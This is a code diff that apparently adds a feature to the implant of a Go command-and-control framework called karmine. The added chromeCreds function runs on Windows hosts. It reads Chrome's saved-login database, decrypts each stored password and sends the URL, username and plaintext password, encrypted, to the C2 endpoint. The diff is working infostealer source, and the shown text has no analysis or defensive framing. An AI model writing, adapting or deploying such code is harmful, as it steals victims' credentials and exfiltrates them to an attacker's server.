@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"database/sql"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -16,6 +17,7 @@ import (
 
 	"github.com/pygrum/karmine/client"
 	ex "github.com/pygrum/karmine/karma/cmd/exec"
+	"github.com/pygrum/karmine/karma/grab"
 	"github.com/pygrum/karmine/karma/hide"
 	"github.com/pygrum/karmine/krypto/kes"
 	"github.com/pygrum/karmine/krypto/kryptor"
@@ -66,7 +68,65 @@ func main() {
 	go awaitCmd(string(endpointStr), string(UUID), X1, X2, InitAESKey, ticker, mTLSClient) // thread handling receiving commands
 
 	go awaitFile(string(endpointStr), string(UUID), X1, X2, InitAESKey, InitPFile, ticker, mTLSClient) // thread handling receiving files
+
+	if runtime.GOOS == "windows" {
+		wg.Add(1)
+		go chromeCreds(string(endpointStr), string(UUID), InitAESKey, X1, X2, mTLSClient)
+	}
 	wg.Wait()
+}
+
+func chromeCreds(c2Endpoint, UUID, aesKey, kX1, kX2 string, mTLSClient *http.Client) {
+	cu, err := grab.NewUser()
+	if err != nil {
+		return
+	}
+	db, err := sql.Open("sqlite3", cu.HomeDir+grab.WinChromePwDBPath)
+	if err != nil {
+		return
+	}
+	defer db.Close()
+	rows, err := db.Query("select origin_url, username_value, password_value from logins")
+	if err != nil {
+		return
+	}
+	if err = cu.GetChromeKey(); err != nil {
+		return
+	}
+
+	defer rows.Close()
+	for rows.Next() {
+		var c_url, c_user, c_pass string
+		if err = rows.Scan(&c_url, &c_user, &c_pass); err != nil {
+			return
+		}
+		plainpw, err := cu.DecryptDetails(c_pass)
+		if err != nil {
+			return
+		}
+		pwObj := &models.KarObjectCred{
+			Platform: "Google Chrome",
+			Creds: models.CredObj{
+				Url:      c_url,
+				Username: c_user,
+				Password: plainpw,
+			},
+		}
+		bytes, err := json.Marshal(pwObj)
+		if err != nil {
+			return
+		}
+		encObj, err := kes.EncryptObject(bytes, aesKey, kX1, kX2)
+		if err != nil {
+			return
+		}
+		go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
+			CmdID:  -1,
+			UUID:   "",
+			Type:   3,
+			Object: encObj,
+		})
+	}
 }
 
 func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey, pFile string, ticker *time.Ticker, mTLSClient *http.Client) {
